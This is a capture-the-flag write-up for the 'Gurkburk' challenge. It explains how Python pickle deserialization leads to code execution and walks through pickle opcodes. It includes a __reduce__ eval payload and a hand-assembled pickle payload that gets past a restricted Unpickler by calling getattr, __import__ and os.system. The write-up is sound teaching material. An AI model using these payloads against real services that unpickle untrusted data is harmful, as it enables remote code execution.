
## Title: Gurkburk
**Points:** 93  
**Solves:** 78

### Descriptions: 
The flag is located in `./flag.txt`. 

We also get an ip and a port to connect to.

### Solution:

I don't remember exactly what the remote services did. It maybe was some game or
a note taking app. But anyhow it allowed us to input a base64 encoded string
which was decoded and passed to `pickle.loads` in python. The title hints to
this since gurkburk is "jar of pickles" or "jar of cucumber" in Swedish. You
could also get an example of what they expected as input in the remote service,
in case you didn't know Swedish.

Anyhow, pickle deserialization. The classical example of getting code
executiion is the following:

```python
class X:
    def __reduce__(self):
        return (eval, ("EVIL CODE HERE", ))

payload = pickle.dumps(X())
```

When pickle `dumps` the class X it calls `__reduce__` and stores the name of the 
function and the arguments in the pickle data. Later, when `loads` is called,
the function provided earlier is called with the given arguments and the return
value is the unserialized value of X(). The legit usage for this is to be able
to make custom pickling code for your custom object.

If we try to submit this to the service we get:

```
_pickle.UnpicklingError: Your pickle is trying to load something sneaky. Only the modules __main__, __builtin__ and copyreg are allowed. eval and exec are not allowed. 'builtins.eval' is forbidden
```

That didn't work. They seem to have made a custom Unpickler. We can only import 
`__main__` (the current module), `__builtin__` and `copyreg` and we can't use
`eval` or `exec`. Luckily for me, the weekend before the Midnight Sun CTF Quals
were the Ångström CTF. During Ångström there were two different problems where
you had to defeat a custom Unpickler, `ekans` and `snake` (might have
misremembered their names). Now I didn't solve any of the Ångström tasks, but
since I tried them I had already dug into the pickle format in detail.

[Here](https://github.com/python/cpython/blob/86684319d3dad8e1a7b0559727a48e0bc50afb01/Lib/pickle.py#L1136)
is the source code for the Unpickler class in python. The `Unpickler.load()`
function is what gets ran when you do `pickle.loads()`. The Unpickler has a
small VM with opcodes and a stack. It works on the stack to rebuild the pickled
object.

We can also see all the opcodes in the format [here](https://github.com/python/cpython/blob/86684319d3dad8e1a7b0559727a48e0bc50afb01/Lib/pickle.py#L107).
Apparently there are multiple versions of the pickle format: 1, 2, 3, 4 and 5.
Newer versions introduce more opcodes. It is easiest to restrict yourself to 
version 1 opcodes as they seem to give all the functionality without extra
complexity.

Some opcodes worth pointing out are `R`, `c` and `.`. `R` stands for reduce and
calls the function lying on the stack with arguments also lying on the stack. It
places the return value from the call on the top of the stack. But how do we get
a function on the stack? With `c`.

`c` loads something from a module and puts it on the stack. For example you can
load a function, like `eval` from the module `__builtin__`, put it on the stack
and then call it using `R`.

Finally, `.` stops the pickling process, takes the element on the top of the
stack and returns it as the final unserialized value.

By looking through which functions we have in the allowed modules `__builtin__`
and `copyreg` we can come up with a payload:

```python
getattr(__import__("os"), "system")("cat flag.txt")
```

`__import__` and `getattr` are both part of `__builtin__`. We can now build this
payload using the pickle opcodes specified above (and a few more). The final solution script 
becomes:

```python
def load_str(s):
    return b"X" + p32(len(s)) + s.encode()

custom_p  = b""
custom_p += b"c__builtin__\ngetattr\n"
custom_p += b"("
custom_p += b"c__builtin__\n__import__\n"
custom_p += b"("
custom_p += load_str("os")
custom_p += b"t"
custom_p += b"R"
custom_p += load_str("system")
custom_p += b"t"
custom_p += b"R"
custom_p += b"("
custom_p += load_str("cat flag.txt")
custom_p += b"t"
custom_p += b"R"
custom_p += b"."

payload = base64.b64encode(custom_p)
```

If we send this to the service it gives us the flag:

**Flag:** midnight{d311c10u5_p1ck135_f0r_3v3ry0n3}
